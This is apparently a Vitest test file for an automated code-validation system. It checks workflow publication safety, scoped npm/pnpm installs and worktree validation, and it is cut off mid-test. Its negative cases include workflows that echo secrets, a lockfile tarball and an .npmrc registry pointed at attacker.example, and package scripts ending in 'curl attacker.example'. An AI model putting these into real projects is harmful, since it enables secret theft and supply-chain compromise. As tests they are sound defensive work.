import { execFileSync } from "node:child_process";
import { access, mkdir, mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

import { describe, expect, it, vi } from "vitest";
import * as localScopeRuntime from "../src/runtime/local-scope.js";
import { runContainedProcess } from "../src/runtime/process-group.js";

import { normalizeArtifact } from "../src/execution/artifacts.js";
import type { WorkerPacket } from "../src/protocol/worker-packet.js";
import {
  cleanupLocalWorktree,
  collectLocalArtifact,
  createLocalWorktree,
} from "../src/runtime/local-worktree.js";
import {
  discardValidationResult,
  validationFailureReason,
  validateArtifactClean,
} from "../src/validation/clean-run.js";
import { assertReviewOnlyWorkflowArtifacts } from "../src/publication/workflow-safety.js";
import { verifyValidationEvidence } from "../src/validation/evidence.js";
import { pnpmBootstrapLock } from "./helpers/pnpm-bootstrap.js";
import { selectedManagedRuntimeRequirements } from "./helpers/managed-runtime.js";

async function repositoryFixture(): Promise<{ repository: string; baseSha: string }> {
  const repository = await mkdtemp(join(tmpdir(), "factory-validation-repo-"));
  execFileSync("git", ["init", "-q", "-b", "main"], { cwd: repository });
  execFileSync("git", ["config", "user.name", "Factory Test"], { cwd: repository });
  execFileSync("git", ["config", "user.email", "factory@example.invalid"], {
    cwd: repository,
  });
  await writeFile(join(repository, "value.txt"), "base\n");
  execFileSync("git", ["add", "value.txt"], { cwd: repository });
  execFileSync("git", ["commit", "-q", "-m", "base"], { cwd: repository });
  return {
    repository,
    baseSha: execFileSync("git", ["rev-parse", "HEAD"], {
      cwd: repository,
      encoding: "utf8",
    }).trim(),
  };
}

async function nodeRepositoryFixture(): Promise<{ repository: string; baseSha: string }> {
  const fixture = await repositoryFixture();
  await writeFile(
    join(fixture.repository, "package.json"),
    JSON.stringify({
      name: "factory-validation-fixture",
      version: "1.0.0",
      scripts: { test: "node verify.cjs" },
    }),
  );
  await writeFile(
    join(fixture.repository, "package-lock.json"),
    JSON.stringify({
      name: "factory-validation-fixture",
      version: "1.0.0",
      lockfileVersion: 3,
      requires: true,
      packages: {
        "": { name: "factory-validation-fixture", version: "1.0.0" },
      },
    }),
  );
  await writeFile(
    join(fixture.repository, "verify.cjs"),
    "const fs = require('node:fs'); process.exit(fs.readFileSync('value.txt', 'utf8') === 'changed\\n' ? 0 : 1);\n",
  );
  execFileSync("git", ["add", "package.json", "package-lock.json", "verify.cjs"], {
    cwd: fixture.repository,
  });
  execFileSync("git", ["commit", "-q", "-m", "node fixture"], {
    cwd: fixture.repository,
  });
  return {
    repository: fixture.repository,
    baseSha: execFileSync("git", ["rev-parse", "HEAD"], {
      cwd: fixture.repository,
      encoding: "utf8",
    }).trim(),
  };
}

async function pnpmRepositoryFixture(): Promise<{ repository: string; baseSha: string }> {
  const fixture = await repositoryFixture();
  await mkdir(join(fixture.repository, "test"));
  await writeFile(
    join(fixture.repository, "package.json"),
    JSON.stringify({
      name: "factory-pnpm-validation-fixture",
      version: "1.0.0",
      private: true,
      packageManager: "pnpm@10.34.5",
      scripts: {
        check: "node --test test/check.js",
        verify: "node --test test/verify.js",
      },
    }),
  );
  await writeFile(
    join(fixture.repository, "pnpm-lock.yaml"),
    "lockfileVersion: '9.0'\nimporters:\n  .: {}\n",
  );
  await writeFile(join(fixture.repository, "test/check.js"), "// check\n");
  await writeFile(join(fixture.repository, "test/verify.js"), "// verify\n");
  execFileSync("git", ["add", "package.json", "pnpm-lock.yaml", "test"], {
    cwd: fixture.repository,
  });
  execFileSync("git", ["commit", "-q", "-m", "pnpm fixture"], {
    cwd: fixture.repository,
  });
  return {
    repository: fixture.repository,
    baseSha: execFileSync("git", ["rev-parse", "HEAD"], {
      cwd: fixture.repository,
      encoding: "utf8",
    }).trim(),
  };
}

function packet(baseSha: string, over: Partial<WorkerPacket> = {}): WorkerPacket {
  const result: WorkerPacket = {
    goal: "Change the value.",
    acceptanceCriteria: ["value.txt contains changed"],
    allowedPaths: ["value.txt"],
    preconditions: [],
    outOfScope: [],
    conventions: [],
    baseSha,
    validationCommands: ["grep -qx changed value.txt"],
    requirements: {
      os: ["linux"],
      architecture: [],
      tools: ["grep"],
      services: [],
      networkDestinations: [],
      permittedSecretNames: [],
      trust: "trusted_local",
    },
    artifactContract: "clockgrove.factory/artifact-v1",
    ...over,
  };
  if (over.managedRuntimes === undefined) {
    const managedRuntimes = selectedManagedRuntimeRequirements(result.validationCommands);
    if (managedRuntimes.length > 0) result.managedRuntimes = managedRuntimes;
  }
  return result;
}

describe("clean validation", () => {
  it("permits workflow publication only when the changed workflow cannot run before protected-branch merge", async () => {
    const root = await mkdtemp(join(tmpdir(), "factory-workflow-publication-"));
    const path = ".github/workflows/ci.yml";
    await mkdir(dirname(join(root, path)), { recursive: true });
    const safe = `name: CI
on:
  push:
    branches:
      - main
permissions:
  contents: read
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@0123456789012345678901234567890123456789
        with:
          persist-credentials: false
      - run: pnpm check
`;
    const safeActions = {
      defaultWorkflowPermissions: "read" as const,
      referencedSecrets: [],
    };
    const inspect = (
      branch: string | undefined,
      scripts: readonly string[] = [],
      baseWorkflows: ReadonlyMap<string, string> = new Map(),
    ) =>
      assertReviewOnlyWorkflowArtifacts(root, [path], branch, scripts, baseWorkflows, safeActions);
    await writeFile(join(root, path), safe);
    await expect(inspect("main")).resolves.toEqual(new Set([path]));
    await expect(assertReviewOnlyWorkflowArtifacts(root, [path])).rejects.toThrow(
      /exact protected base branch/,
    );
    await writeFile(join(root, path), safe.replace("  push:\n", "  pull_request:\n"));
    await expect(inspect("main")).rejects.toThrow(/unsafe trigger|only after a push/);
    await writeFile(join(root, path), safe.replace("      - main", "      - feature"));
    await expect(inspect("main")).rejects.toThrow(/only after a push/);
    for (const unsafe of [
      safe.replace("      - main", "      - main\n      - feature/**"),
      safe.replace("  push:", "  pull_request:"),
      safe.replace("  push:", "  pull_request_target:"),
      safe.replace("  push:", "  workflow_run:"),
      safe.replace("  push:", "  create:"),
      safe.replace("  push:", "  workflow_dispatch:"),
      safe.replace("    steps:", "    permissions:\n      contents: write\n    steps:"),
      safe.replace("      - run: pnpm check", "      - run: echo ${{ secrets['TOKEN'] }}"),
      safe.replace("      - run: pnpm check", "      - run: echo ${{ toJSON(secrets) }}"),
      safe.replace("  contents: read", "  contents: read\n  id-token: write"),
      safe.replace("runs-on: ubuntu-latest", "runs-on: self-hosted"),
      safe.replace(
        "uses: actions/checkout@0123456789012345678901234567890123456789",
        "uses:\n          repository: actions/checkout",
      ),
      safe.replace("          persist-credentials: false", "          persist-credentials: true"),
      safe.replace("      - run: pnpm check", "      - token: inherited\n        run: pnpm check"),
    ]) {
      await writeFile(join(root, path), unsafe);
      await expect(inspect("main")).rejects.toThrow();
    }

    const basePath = ".github/workflows/base.yml";
    await writeFile(
      join(root, basePath),
      safe.replace("  push:\n    branches:\n      - main", "  pull_request:"),
    );
    await writeFile(join(root, path), safe);
    await expect(inspect("main", ["check"], new Map([[basePath, safe]]))).rejects.toThrow(
      /base workflow .* may acquire changed package-script authority/,
    );
    await expect(
      inspect(
        "main",
        [],
        new Map([
          [path, safe.replace("  push:\n    branches:\n      - main", "  pull_request_target:")],
        ]),
      ),
    ).rejects.toThrow(/base workflow may run or be chained.*pull_request_target/);
    await expect(
      assertReviewOnlyWorkflowArtifacts(
        root,
        [".github/actions/local/action.yml"],
        "main",
        [],
        new Map([
          [basePath, safe.replace("  push:\n    branches:\n      - main", "  pull_request:")],
        ]),
      ),
    ).rejects.toThrow(/base workflow may run or be chained.*pull_request/);
    await expect(
      inspect(
        "main",
        [],
        new Map([[path, safe.replace("  push:\n    branches:\n      - main", "  create:")]]),
      ),
    ).rejects.toThrow(/feature ref or pull request.*create/);
    await expect(
      inspect(
        "main",
        [],
        new Map([[path, safe.replace("  push:\n    branches:\n      - main", "  push:")]]),
      ),
    ).rejects.toThrow(/push trigger is not restricted to protected branch main/);
    await expect(
      assertReviewOnlyWorkflowArtifacts(root, [path], "main", [], new Map(), {
        defaultWorkflowPermissions: "write",
        referencedSecrets: [],
      }),
    ).rejects.toThrow(/read-only repository Actions permissions/);
  });

  it("fences scoped npm setup and tests in order and retains actual command evidence", async () => {
    const fixture = await nodeRepositoryFixture();
    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await writeFile(join(worker.path, "value.txt"), "changed\n");
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);
    const stages: string[] = [];
    const scoped = vi
      .spyOn(localScopeRuntime, "runScopedLocalProcess")
      .mockImplementation(async (identity, options) => {
        stages.push(`run-${identity.commandIndex}`);
        expect(identity.invocationDigest).toBe(artifact.digest);
        return runContainedProcess(options);
      });
    try {
      const result = await validateArtifactClean({
        repository: fixture.repository,
        artifact,
        packet: packet(fixture.baseSha, {
          validationCommands: ["npm test"],
          requirements: {
            ...packet(fixture.baseSha).requirements,
            tools: ["npm", "node"],
          },
        }),
        localScope: {
          identity: {
            protocol: "clockgrove.factory/local-scope-v1",
            repository: "o/r",
            objective: 1,
            workItem: 2,
            attempt: 1,
            runId: "source",
            directorEpoch: 1,
            policyDigest: "a".repeat(64),
            phase: "validation",
            invocationDigest: artifact.digest,
            hostIdentity: "b".repeat(64),
          },
          deadline: new Date(Date.now() + 60_000).toISOString(),
          beforeLaunch: async (identity) => {
            stages.push(`fence-${identity.commandIndex}`);
          },
          afterStop: async (identity) => {
            stages.push(`stop-${identity.commandIndex}`);
          },
        },
      });
      expect(stages).toEqual(["fence-0", "run-0", "stop-0", "fence-1", "run-1", "stop-1"]);
      expect(result.evidence.passed).toBe(true);
      expect(result.evidence.commands.map((entry) => entry.command)).toEqual([
        "npm ci --no-audit --no-fund",
        "npm test",
      ]);
      await discardValidationResult(result);
    } finally {
      scoped.mockRestore();
    }
  });

  it.each(["fence", "deadline", "cleanup"] as const)(
    "does not fall back to unscoped tests after %s failure",
    async (failure) => {
      const fixture = await repositoryFixture();
      const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
      await writeFile(join(worker.path, "value.txt"), "changed\n");
      const artifact = await collectLocalArtifact(worker);
      await cleanupLocalWorktree(worker);
      let retainedPath = "";
      const scoped = vi
        .spyOn(localScopeRuntime, "runScopedLocalProcess")
        .mockImplementation(async (identity, options) => {
          retainedPath = options.cwd;
          throw new localScopeRuntime.LocalScopeCleanupError(identity, {
            exitCode: 0,
            signal: null,
            stdout: "",
            stderr: "",
            durationMs: 1,
            timedOut: false,
          });
        });
      const afterStop = vi.fn(async () => {});
      try {
        await expect(
          validateArtifactClean({
            repository: fixture.repository,
            artifact,
            packet: packet(fixture.baseSha),
            localScope: {
              identity: {
                protocol: "clockgrove.factory/local-scope-v1",
                repository: "o/r",
                objective: 1,
                workItem: 2,
                attempt: 1,
                runId: "source",
                directorEpoch: 1,
                policyDigest: "a".repeat(64),
                phase: "validation",
                invocationDigest: artifact.digest,
                hostIdentity: "b".repeat(64),
              },
              deadline: new Date(Date.now() + (failure === "deadline" ? -1 : 60_000)).toISOString(),
              beforeLaunch: async () => {
                if (failure === "fence") throw new Error("fence lost");
              },
              afterStop,
            },
          }),
        ).rejects.toThrow(
          failure === "cleanup"
            ? /cleanup is unverified/
            : failure === "deadline"
              ? /deadline expired/
              : /fence lost/,
        );
        expect(scoped).toHaveBeenCalledTimes(failure === "cleanup" ? 1 : 0);
        expect(afterStop).not.toHaveBeenCalled();
        if (retainedPath) {
          await expect(access(retainedPath)).resolves.toBeUndefined();
          await cleanupLocalWorktree({
            path: retainedPath,
            root: dirname(retainedPath),
            repository: fixture.repository,
            baseSha: fixture.baseSha,
          });
        }
      } finally {
        scoped.mockRestore();
      }
    },
  );

  it("never executes host validation when an isolated validator was explicitly selected", async () => {
    const fixture = await repositoryFixture();
    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await writeFile(join(worker.path, "value.txt"), "changed\n");
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);
    let invoked = false;
    await expect(
      validateArtifactClean({
        repository: fixture.repository,
        artifact,
        packet: packet(fixture.baseSha),
        isolatedValidator: async () => {
          invoked = true;
          throw new Error("isolated provider unavailable");
        },
      }),
    ).rejects.toThrow(/isolated provider unavailable/);
    expect(invoked).toBe(true);
  });
  it("retains bounded command diagnostics for the next retry", () => {
    const reason = validationFailureReason("validation", "npm run typecheck", {
      exitCode: 2,
      timedOut: false,
      stdout: "src/example.ts(4,2): error TS2322: Type string is not assignable",
      stderr: "",
    });
    expect(reason).toContain("validation failed (2): npm run typecheck");
    expect(reason).toContain("error TS2322");
    expect(
      validationFailureReason("validation", "npm test", {
        exitCode: 1,
        timedOut: false,
        stdout: "x".repeat(20_000),
        stderr: "",
      }).length,
    ).toBeLessThan(8_000);
  });

  it("applies and tests an artifact in a fresh exact-SHA worktree", async () => {
    const fixture = await repositoryFixture();
    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await writeFile(join(worker.path, "value.txt"), "changed\n");
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);

    // A worker's own reported command is deliberately false evidence.
    artifact.commands.push({ command: "false", exitCode: 0, durationMs: 1 });
    artifact.digest = (await import("../src/execution/artifacts.js")).artifactDigest(artifact);

    const result = await validateArtifactClean({
      repository: fixture.repository,
      artifact,
      packet: packet(fixture.baseSha),
    });
    expect(result.evidence.passed).toBe(true);
    expect(result.evidence.commands).toHaveLength(1);
    expect(result.evidence.commands[0]?.command).toContain("grep -qx changed");
    verifyValidationEvidence(result.evidence);
    await discardValidationResult(result);
  });

  it("does not source host login profiles during authoritative validation", async () => {
    const fixture = await repositoryFixture();
    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await writeFile(join(worker.path, "value.txt"), "changed\n");
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);
    const fakeHome = await mkdtemp(join(tmpdir(), "factory-validation-home-"));
    const marker = join(fakeHome, "profile-was-sourced");
    await writeFile(join(fakeHome, ".profile"), `touch ${JSON.stringify(marker)}\n`);
    const priorHome = process.env.HOME;
    process.env.HOME = fakeHome;
    try {
      const result = await validateArtifactClean({
        repository: fixture.repository,
        artifact,
        packet: packet(fixture.baseSha),
      });
      expect(result.evidence.passed).toBe(true);
      await expect(access(marker)).rejects.toThrow();
      await discardValidationResult(result);
    } finally {
      if (priorHome === undefined) delete process.env.HOME;
      else process.env.HOME = priorHome;
    }
  });

  it("records failed authoritative commands", async () => {
    const fixture = await repositoryFixture();
    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await writeFile(join(worker.path, "value.txt"), "wrong\n");
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);

    const result = await validateArtifactClean({
      repository: fixture.repository,
      artifact,
      packet: packet(fixture.baseSha),
    });
    expect(result.evidence.passed).toBe(false);
    expect(result.evidence.failureReason).toMatch(/validation failed/);
    await discardValidationResult(result);
  });

  it("installs locked npm dependencies before authoritative commands", async () => {
    const fixture = await nodeRepositoryFixture();
    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await writeFile(join(worker.path, "value.txt"), "changed\n");
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);

    const result = await validateArtifactClean({
      repository: fixture.repository,
      artifact,
      packet: packet(fixture.baseSha, {
        validationCommands: ["npm test"],
        requirements: {
          ...packet(fixture.baseSha).requirements,
          tools: ["npm", "node"],
        },
      }),
    });
    expect(result.evidence.passed).toBe(true);
    expect(result.evidence.commands.map(({ command }) => command)).toEqual([
      "npm ci --no-audit --no-fund",
      "npm test",
    ]);
    await discardValidationResult(result);
  });

  it("binds a greenfield pnpm check to pinned, hook-free materialized package scripts", async () => {
    const fixture = await repositoryFixture();
    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await mkdir(join(worker.path, "packages", "example"), { recursive: true });
    await writeFile(
      join(worker.path, "package.json"),
      JSON.stringify({
        name: "greenfield",
        private: true,
        packageManager: "pnpm@10.34.5",
        scripts: { check: "turbo run check" },
        devDependencies: { turbo: "2.5.6", typescript: "5.9.2" },
      }),
    );
    await writeFile(
      join(worker.path, "pnpm-lock.yaml"),
      pnpmBootstrapLock([".", "packages/example"], ["turbo@2.5.6", "typescript@5.9.2"]),
    );
    await writeFile(join(worker.path, "pnpm-workspace.yaml"), "packages:\n  - packages/*\n");
    await writeFile(join(worker.path, "turbo.json"), '{"tasks":{"check":{}}}\n');
    await writeFile(
      join(worker.path, "packages", "example", "package.json"),
      JSON.stringify({ name: "example", scripts: { check: "tsc --noEmit" } }),
    );
    execFileSync(
      "git",
      [
        "add",
        "package.json",
        "pnpm-lock.yaml",
        "pnpm-workspace.yaml",
        "turbo.json",
        "packages/example/package.json",
      ],
      { cwd: worker.path },
    );
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);
    const scoped = vi
      .spyOn(localScopeRuntime, "runScopedLocalProcess")
      .mockImplementation(async (identity) => ({
        exitCode: 0,
        signal: null,
        stdout: identity.commandIndex === 0 ? "10.34.5\n" : "",
        stderr: "",
        durationMs: 1,
        timedOut: false,
      }));
    try {
      const result = await validateArtifactClean({
        repository: fixture.repository,
        artifact,
        packet: packet(fixture.baseSha, {
          allowedPaths: [
            "package.json",
            "pnpm-lock.yaml",
            "pnpm-workspace.yaml",
            "turbo.json",
            "packages/",
          ],
          validationCommands: ["pnpm check"],
          requirements: {
            ...packet(fixture.baseSha).requirements,
            tools: ["node", "pnpm"],
            networkDestinations: ["registry.npmjs.org"],
          },
        }),
        localScope: {
          identity: {
            protocol: "clockgrove.factory/local-scope-v1",
            repository: "o/r",
            objective: 1,
            workItem: 2,
            attempt: 1,
            runId: "greenfield",
            directorEpoch: 1,
            policyDigest: "a".repeat(64),
            phase: "validation",
            invocationDigest: artifact.digest,
            hostIdentity: "b".repeat(64),
          },
          deadline: new Date(Date.now() + 60_000).toISOString(),
          beforeLaunch: async () => {},
          afterStop: async () => {},
        },
      });
      expect(result.evidence.commands.map(({ command }) => command)).toEqual([
        "pnpm --version",
        "pnpm install --frozen-lockfile --ignore-scripts --registry=https://registry.npmjs.org/",
        "pnpm check",
      ]);
      expect(scoped).toHaveBeenNthCalledWith(
        1,
        expect.objectContaining({ commandIndex: 0 }),
        expect.objectContaining({
          command: expect.stringMatching(/\/pnpm\/root\/pnpm$/),
          args: ["--version"],
        }),
      );
      expect(scoped).toHaveBeenNthCalledWith(
        2,
        expect.objectContaining({ commandIndex: 1 }),
        expect.objectContaining({
          command: expect.stringMatching(/\/pnpm\/root\/pnpm$/),
          args: [
            "install",
            "--frozen-lockfile",
            "--ignore-scripts",
            "--registry=https://registry.npmjs.org/",
          ],
        }),
      );
      expect(scoped).toHaveBeenNthCalledWith(
        3,
        expect.objectContaining({ commandIndex: 2 }),
        expect.objectContaining({
          command: expect.stringMatching(/\/pnpm\/root\/pnpm$/),
          args: ["run", "check"],
        }),
      );
      expect(result.evidence.passed).toBe(true);
      await discardValidationResult(result);

      const isolated = await validateArtifactClean({
        repository: fixture.repository,
        artifact,
        packet: packet(fixture.baseSha, {
          allowedPaths: [
            "package.json",
            "pnpm-lock.yaml",
            "pnpm-workspace.yaml",
            "turbo.json",
            "packages/",
          ],
          validationCommands: ["pnpm check"],
          requirements: {
            ...packet(fixture.baseSha).requirements,
            tools: ["node", "pnpm"],
            networkDestinations: ["registry.npmjs.org"],
            trust: "isolated",
          },
        }),
        isolatedValidator: async () => ({
          outputTreeSha: artifact.fileManifest!.resultTreeSha,
          commands: [
            { command: "pnpm --version", exitCode: 0, durationMs: 1 },
            {
              command:
                "pnpm install --frozen-lockfile --ignore-scripts --registry=https://registry.npmjs.org/",
              exitCode: 0,
              durationMs: 1,
            },
            { command: "pnpm check", exitCode: 0, durationMs: 1 },
          ],
          passed: true,
          startedAt: "2026-09-09T18:00:00.000Z",
          completedAt: "2026-09-09T18:00:01.000Z",
          environmentIdentity: `docker.io/library/node@sha256:${"a".repeat(64)}`,
        }),
      });
      expect(isolated.evidence.commands.map(({ command }) => command)).toEqual([
        "pnpm --version",
        "pnpm install --frozen-lockfile --ignore-scripts --registry=https://registry.npmjs.org/",
        "pnpm check",
      ]);
      expect(scoped).toHaveBeenCalledTimes(3);
      await discardValidationResult(isolated);
    } finally {
      scoped.mockRestore();
    }
  });

  it("materializes a later script generation only for its declared descendant operation", async () => {
    const fixture = await pnpmRepositoryFixture();
    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await writeFile(join(worker.path, "test/verify-next.js"), "// next generation\n");
    await writeFile(
      join(worker.path, "package.json"),
      JSON.stringify({
        name: "factory-pnpm-validation-fixture",
        version: "1.0.0",
        private: true,
        packageManager: "pnpm@10.34.5",
        scripts: {
          check: "node --test test/check.js",
          verify: "node --test test/verify-next.js",
        },
      }),
    );
    execFileSync("git", ["add", "package.json", "test/verify-next.js"], { cwd: worker.path });
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);
    const scoped = vi
      .spyOn(localScopeRuntime, "runScopedLocalProcess")
      .mockImplementation(async (identity) => ({
        exitCode: 0,
        signal: null,
        stdout: identity.commandIndex === 0 ? "10.34.5\n" : "",
        stderr: "",
        durationMs: 1,
        timedOut: false,
      }));
    try {
      const result = await validateArtifactClean({
        repository: fixture.repository,
        artifact,
        packet: packet(fixture.baseSha, {
          allowedPaths: ["package.json", "test/"],
          validationCommands: ["pnpm verify"],
          requirements: {
            ...packet(fixture.baseSha).requirements,
            tools: ["node", "pnpm"],
            networkDestinations: ["registry.npmjs.org"],
          },
          repositoryCapabilities: {
            provides: [
              {
                adapter: "node-pnpm",
                generation: "node-pnpm/mutate",
                authorityPaths: ["package.json"],
                operations: [{ kind: "package-script", key: "verify" }],
              },
            ],
            requires: [
              {
                adapter: "node-pnpm",
                generation: "node-pnpm/bootstrap",
                providerWorkItem: "bootstrap",
                authorityPaths: ["package.json", "pnpm-lock.yaml"],
                operation: { kind: "package-script", key: "verify" },
                activation: "integrated-base",
              },
            ],
          },
        }),
        localScope: {
          identity: {
            protocol: "clockgrove.factory/local-scope-v1",
            repository: "o/r",
            objective: 1,
            workItem: 3,
            attempt: 1,
            runId: "later-generation",
            directorEpoch: 1,
            policyDigest: "a".repeat(64),
            phase: "validation",
            invocationDigest: artifact.digest,
            hostIdentity: "b".repeat(64),
          },
          deadline: new Date(Date.now() + 60_000).toISOString(),
          beforeLaunch: async () => {},
          afterStop: async () => {},
        },
      });
      expect(result.evidence.passed).toBe(true);
      expect(result.publicationReview.changedPackageScripts).toEqual(["verify"]);
      expect(result.evidence.commands.map(({ command }) => command)).toEqual([
        "pnpm --version",
        "pnpm install --frozen-lockfile --ignore-scripts --registry=https://registry.npmjs.org/",
        "pnpm verify",
      ]);
      await discardValidationResult(result);
    } finally {
      scoped.mockRestore();
    }
  });

  it.each([
    [
      "undeclared script",
      {
        check: "node --test test/check.js",
        verify: "node --test test/verify.js",
        lint: "eslint .",
      },
      /undeclared package script/,
    ],
    [
      "unsafe selected body",
      { check: "node --test test/check.js", verify: "node --test test/verify.js && curl x" },
      /finite validation allowlist/,
    ],
    [
      "lifecycle hook",
      {
        check: "node --test test/check.js",
        verify: "node --test test/verify.js",
        preinstall: "node test/verify.js",
      },
      /lifecycle hook/,
    ],
  ] as const)(
    "rejects an established pnpm generation with an %s",
    async (_name, scripts, reason) => {
      const fixture = await pnpmRepositoryFixture();
      const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
      await writeFile(
        join(worker.path, "package.json"),
        JSON.stringify({
          name: "factory-pnpm-validation-fixture",
          version: "1.0.0",
          private: true,
          packageManager: "pnpm@10.34.5",
          scripts,
        }),
      );
      execFileSync("git", ["add", "package.json"], { cwd: worker.path });
      const artifact = await collectLocalArtifact(worker);
      await cleanupLocalWorktree(worker);
      await expect(
        validateArtifactClean({
          repository: fixture.repository,
          artifact,
          packet: packet(fixture.baseSha, {
            allowedPaths: ["package.json", "test/"],
            validationCommands: ["pnpm verify"],
            requirements: {
              ...packet(fixture.baseSha).requirements,
              tools: ["node", "pnpm"],
              networkDestinations: ["registry.npmjs.org"],
            },
            repositoryCapabilities: {
              provides: [
                {
                  adapter: "node-pnpm",
                  generation: "node-pnpm/mutate",
                  authorityPaths: ["package.json"],
                  operations: [{ kind: "package-script", key: "verify" }],
                },
              ],
              requires: [],
            },
          }),
        }),
      ).rejects.toThrow(reason);
    },
  );

  it("rejects exotic, unverified, and escaping pnpm lockfile authority", async () => {
    const valid = pnpmBootstrapLock(["."], ["typescript@5.9.2"]);
    for (const lockfile of [
      valid.replace(
        /resolution: \{integrity: sha512-[A-Za-z0-9+/=]+}/,
        "resolution: {tarball: https://attacker.example/typescript.tgz}",
      ),
      valid.replace(/resolution: \{integrity: sha512-[A-Za-z0-9+/=]+}/, "resolution: {}"),
      valid.replace(
        "  '.': {}",
        "  '.':\n    dependencies:\n      escape:\n        specifier: workspace:*\n        version: link:../../outside",
      ),
    ]) {
      const fixture = await repositoryFixture();
      const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
      await writeFile(
        join(worker.path, "package.json"),
        JSON.stringify({
          name: "greenfield",
          packageManager: "pnpm@10.34.5",
          scripts: { check: "tsc --noEmit" },
          devDependencies: { typescript: "5.9.2" },
        }),
      );
      await writeFile(join(worker.path, "pnpm-lock.yaml"), lockfile);
      execFileSync("git", ["add", "package.json", "pnpm-lock.yaml"], { cwd: worker.path });
      const artifact = await collectLocalArtifact(worker);
      await cleanupLocalWorktree(worker);
      await expect(
        validateArtifactClean({
          repository: fixture.repository,
          artifact,
          packet: packet(fixture.baseSha, {
            allowedPaths: ["package.json", "pnpm-lock.yaml"],
            validationCommands: ["pnpm check"],
            requirements: {
              ...packet(fixture.baseSha).requirements,
              tools: ["node", "pnpm"],
              networkDestinations: ["registry.npmjs.org"],
            },
          }),
        }),
      ).rejects.toThrow(/pnpm lockfile/);
    }
  });

  it("rejects repository package-manager configuration that could redirect setup", async () => {
    const fixture = await repositoryFixture();
    await writeFile(
      join(fixture.repository, ".npmrc"),
      "@scope:registry=https://attacker.example\n",
    );
    execFileSync("git", ["add", ".npmrc"], { cwd: fixture.repository });
    execFileSync("git", ["commit", "-qm", "add registry configuration"], {
      cwd: fixture.repository,
    });
    fixture.baseSha = execFileSync("git", ["rev-parse", "HEAD"], {
      cwd: fixture.repository,
      encoding: "utf8",
    }).trim();
    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await writeFile(
      join(worker.path, "package.json"),
      JSON.stringify({
        name: "greenfield",
        packageManager: "pnpm@10.34.5",
        scripts: { check: "tsc --noEmit" },
        devDependencies: { typescript: "5.9.2" },
      }),
    );
    await writeFile(
      join(worker.path, "pnpm-lock.yaml"),
      pnpmBootstrapLock(["."], ["typescript@5.9.2"]),
    );
    execFileSync("git", ["add", "package.json", "pnpm-lock.yaml"], { cwd: worker.path });
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);
    await expect(
      validateArtifactClean({
        repository: fixture.repository,
        artifact,
        packet: packet(fixture.baseSha, {
          allowedPaths: ["package.json", "pnpm-lock.yaml"],
          validationCommands: ["pnpm check"],
          requirements: {
            ...packet(fixture.baseSha).requirements,
            tools: ["node", "pnpm"],
            networkDestinations: ["registry.npmjs.org"],
          },
        }),
      }),
    ).rejects.toThrow(/forbids package-manager configuration: \.npmrc/);
  });

  it("refuses setup when the installed pnpm tool differs from the artifact pin", async () => {
    const fixture = await repositoryFixture();
    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await writeFile(
      join(worker.path, "package.json"),
      JSON.stringify({
        name: "greenfield",
        packageManager: "pnpm@10.34.5",
        scripts: { check: "tsc --noEmit" },
        devDependencies: { typescript: "5.9.2" },
      }),
    );
    await writeFile(
      join(worker.path, "pnpm-lock.yaml"),
      pnpmBootstrapLock(["."], ["typescript@5.9.2"]),
    );
    execFileSync("git", ["add", "package.json", "pnpm-lock.yaml"], { cwd: worker.path });
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);
    const scoped = vi.spyOn(localScopeRuntime, "runScopedLocalProcess").mockResolvedValue({
      exitCode: 0,
      signal: null,
      stdout: "10.17.0\n",
      stderr: "",
      durationMs: 1,
      timedOut: false,
    });
    try {
      const result = await validateArtifactClean({
        repository: fixture.repository,
        artifact,
        packet: packet(fixture.baseSha, {
          allowedPaths: ["package.json", "pnpm-lock.yaml"],
          validationCommands: ["pnpm check"],
          requirements: {
            ...packet(fixture.baseSha).requirements,
            tools: ["node", "pnpm"],
            networkDestinations: ["registry.npmjs.org"],
          },
        }),
        localScope: {
          identity: {
            protocol: "clockgrove.factory/local-scope-v1",
            repository: "o/r",
            objective: 1,
            workItem: 2,
            attempt: 1,
            runId: "pnpm-version-mismatch",
            directorEpoch: 1,
            policyDigest: "a".repeat(64),
            phase: "validation",
            invocationDigest: artifact.digest,
            hostIdentity: "b".repeat(64),
          },
          deadline: new Date(Date.now() + 60_000).toISOString(),
          beforeLaunch: async () => {},
          afterStop: async () => {},
        },
      });
      expect(result.evidence).toMatchObject({
        passed: false,
        commands: [{ command: "pnpm --version", exitCode: 1 }],
        failureReason: expect.stringContaining("expected 10.34.5"),
      });
      expect(scoped).toHaveBeenCalledOnce();
      await discardValidationResult(result);
    } finally {
      scoped.mockRestore();
    }
  });

  it("rejects greenfield lifecycle hooks, shell control, and unpinned dependencies", async () => {
    for (const manifest of [
      {
        scripts: { check: "tsc --noEmit", precheck: "node --test bootstrap.test.js" },
        devDependencies: { typescript: "5.9.2" },
      },
      {
        scripts: { check: "tsc --noEmit && curl attacker.example" },
        devDependencies: { typescript: "5.9.2" },
      },
      {
        scripts: { check: "tsc --noEmit", postinstall: "node bootstrap.test.js" },
